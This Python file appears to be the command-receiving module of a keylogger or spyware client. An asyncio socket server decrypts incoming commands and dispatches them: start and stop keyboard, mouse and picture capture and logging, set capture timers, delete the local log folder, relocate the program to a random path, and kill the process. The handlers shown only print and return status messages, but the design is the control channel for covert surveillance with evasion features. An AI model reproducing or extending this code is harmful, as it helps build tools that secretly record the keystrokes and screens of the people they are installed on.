from module_crypto import decrypt_message
from functions import *
from tasks_const import TASKS as t
from tasks_const import TASKS_DESCRIPTION as td
import socket, asyncio

class Server_subprocess:
    """Server class for client app (receive data)"""
    
    async def ainit(self):
        """ You need to init .env file before using this class"""
        
        try:
            self.config = await load_env()
            self.key = self.config['KEY'].encode()
            self.port_receive = int(self.config['PORT_RECEIVE'])
            self.name = self.config['NAME']
            self.ip = self.config['IP']
            await self.start()
        except Exception as err:
            print(err)
        
    async def start(self):
        """start socket server"""
        
      
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('localhost', self.port_receive))
            s.listen()
            while True:
                conn, addr = s.accept()
                if 1== 0: print(f"Connected by {addr}")# Forced to use addr ...
                
                with conn:
                    while True:
                        encrypted_data = conn.recv(1024)
                        if not encrypted_data:
                            break
                        data = await decrypt_message(encrypted_data, self.key)

                        #Debug data sender
                        # print(b"[ SERVER ] : Data receive '{}'.".format(data))
                        
                        
                        data_array = data.split(" ")
                        task = data_array[0].upper()
                     
                        try:
                            
                            if task in t:
                                
                                index = t.index(task)
                                result = ""
                                printable = {
                                        "error":0,
                                        "index_task": index,
                                        "task": task,
                                        "description": td[index],
                                }
                                
                                ####### - PAUSE - #######
                                if index == 0: #PAUSE_SERVER
                                    result = "Incomplete or invalid command e.g : PAUSE_SERVER 10"
                                    if not int(data_array[1]):raise Exception("Error, the second argument must be an integer")#Check argument if is integer
                                    else:
                                        printable["x_break"] = data_array[1]
                                        result = "Task '{}' found, description : {}. For {} IP : {}. The server sleep for {} secondes".format(task,printable["description"],self.name,self.ip,data_array[1])
                                        print(printable)
                               
                                
                                ####### - STOP - #######
                                elif index == 1: #STOP_SERVER
                                    result = "Task '{}' found, description : {}. For {} IP : {}. The server is down until 00:00 the next day.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 2: #STOP_CAPTURE_KEYBOARD
                                    result = "Task '{}' found, description : {}. For {} IP : {}. The keyboard capture is stopped.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 3: #STOP_CAPTURE_MOUSE
                                    result = "Task '{}' found, description : {}. For {} IP : {}. The mouse capture is stopped.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 4: #STOP_CAPTURE_PICTURE
                                    result = "Task '{}' found, description : {}. For {} IP : {}. The picture capture is stopped.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                
                                ####### - RESTART - #######
                                elif index == 5: #RESTART_SERVER
                                    result = "Task '{}' found, description : {}. For {} IP : {}. The server will be restart.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                    
                                ####### - STOP LOG - #######
                                elif index == 6: #STOP_LOG_KEYBOARD
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Stop save logs in client, concerning keyboard.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 7: #STOP_LOG_MOUSE
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Stop save logs in client, concerning mouse.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 8: #STOP_LOG_PICTURE
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Stop save logs in client, concerning picture.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                
                                ####### - STOP LOG - #######
                                elif index == 9: #START_LOG_KEYBOARD
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Start save logs in client, concerning keyboard.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 10: #START_LOG_MOUSE
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Start save logs in client, concerning mouse.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 11: #START_LOG_PICTURE
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Start save logs in client, concerning picture.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                
                                ####### - STATUS - #######
                                elif index == 12: #STATUS_SERVER ##################### SETUP RETURN
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Status server :".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                elif index == 13: #STATUS_LOG ##################### SETUP RETURN
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Status log :".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                
                                ####### - RESET CONFIG - #######
                                elif index == 14: #STATUS_CAPTURE ##################### SETUP RETURN
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Reset the configuration. Check the new configuration on api.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                
                                ####### - KILL THE PROCESS - #######
                                elif index == 15: #KILL
                                    result = "Bye bye ;)"
                                    print(printable)
                                
                                ####### - LOG_TIMER - #######
                                elif index == 16: #LOG_TIMER ##################### SETUP RETURN
                                    result = "Incomplete or invalid command e.g : LOG_TIMER [KEYBOARD/MOUSE/PICTURE/ALL] 10(secondes)"
                                    if not int(data_array[2]):raise Exception("Error, the second argument must be an integer")#Check argument if is integer
                                    elif not data_array[1].upper() in ["KEYBOARD","MOUSE","PICTURE","ALL"]:raise Exception("Error, the first argument must be KEYBOARD, MOUSE or PICTURE")#Check argument if is integer
                                    else:
                                        printable["type"] = data_array[1]
                                        printable["timer"] = data_array[2]
                                        result = "Task '{}' found, description : {}. For {} IP : {}. Timer is setup for {} - {}/secondes.".format(task,printable["description"],self.name,self.ip,data_array[1],data_array[2])
                                        print(printable)
                                ####### - DELETE CONFIG - #######
                                elif index == 17: #DELETE_LOG ##################### SETUP RETURN > give path
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Deleted local log folder.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                    
                                ####### - MOVE - #######
                                elif index == 18: #MOVE ##################### SETUP RETURN > give path
                                    result = "Task '{}' found, description : {}. For {} IP : {}. Move on random path : THEPATH.".format(task,printable["description"],self.name,self.ip)
                                    print(printable)
                                
                        except Exception:
                            print("{'error':404}")
                        finally:
                            conn.sendall(result.encode())
       
asyncio.run(Server_subprocess().ainit())